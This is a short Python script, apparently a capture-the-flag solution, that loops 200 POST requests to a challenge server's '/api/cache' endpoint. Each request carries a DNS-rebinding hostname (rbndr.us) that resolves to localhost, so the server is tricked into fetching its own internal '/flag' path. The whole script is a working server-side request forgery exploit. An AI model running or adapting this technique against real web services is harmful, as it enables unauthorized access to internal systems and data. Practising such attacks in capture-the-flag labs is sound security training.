import requests

url = "http://178.62.19.68:30714"

endpoint="http://b23e1344.7f000001.rbndr.us:30714/flag"

json={
	"url": endpoint
}


print("startig..")

i = 0
while i<200:
	r = requests.post(url+"/api/cache",json=json,)
	print(len(r.content))
	print(r.text)
	i = i+1

